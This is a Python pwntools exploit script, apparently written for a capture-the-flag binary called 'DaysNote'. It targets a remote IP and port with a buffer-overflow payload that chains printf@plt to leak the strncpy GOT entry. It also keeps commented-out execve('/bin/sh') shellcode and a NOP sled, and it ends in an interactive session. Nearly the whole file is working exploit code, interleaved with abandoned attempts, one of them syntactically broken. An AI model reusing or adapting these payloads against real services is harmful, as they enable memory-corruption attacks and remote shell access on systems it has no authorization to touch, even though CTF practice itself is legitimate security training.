from pwn import *

context.arch = "i386"
context.log_level = "DEBUG"


# isRemote = False
isRemote = True
e = ELF("./DaysNote")

# print("Now : " + hex(i))

if isRemote:
    p = remote("110.10.147.38", 8888)
else:
    p = process("./DaysNote")
    attach(p, "break *0x0804864D\nbrak *0x08048641\n break *0x0804866C\nc")
    raw_input()

p.sendlineafter("Year : ", "4")

# shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
# # len(shellcode) == 25

payload = ""

# payload += "A" + p32(0xffffcb78)*91
# payload += "\x00"

# payload += "\x90"*0x440
# payload += shellcode

# payload = p32(0xf7e3eda0) + "AAAA" + p32(0x080487E0)
# payload += p32(e.plt["strncpy"])*0x40
# payload += p32(0x0804864D) * ((365 / 4) + "A"*(365 % 4) - 0x40)

# payload += "A"
# payload += p32(e.plt["strncpy"])*((364-36) / 4)
# payload += p32(0x0804864D)*11

# payload += "A"
# payload +=*((364-36) / 4)


payload = p32(e.plt["printf"]) + p32(0x0804866E) + p32(e.got["strncpy"])
payload = "AAAAA" + payload * (365 / len(payload)) # + "A" * (365 % len(payload))

# payload += "\x00"
# payload += "\x01"
# payload += "\x02"
# payload += "\x03"
# payload += "\x04"
# payload += "\x05"
# payload += "\x06"
payload += "\x07"
# payload += "\x08"
# payload += "\x09"
# payload += "\x0a"
# payload += "\x0b"
# payload += "\x0c"
# payload += "\x0d"
# payload += "\x0e"

# payload = p32(0x080486FD)
# payload += (p32(0x555d3da0) + "AAAA" + p32(0x080487E0))*0x40
print(len(payload))

p.sendlineafter("Write : ", payload)

print(p.recvuntil("cat flag\n"))

recv = p.recv()

hex_str = recv.encode("hex")
hlist = [hex_str[i:i+8] for i in range(0,len(hex_str),8)]
print("\n".join(hlist))
print(recv)

p.interactive()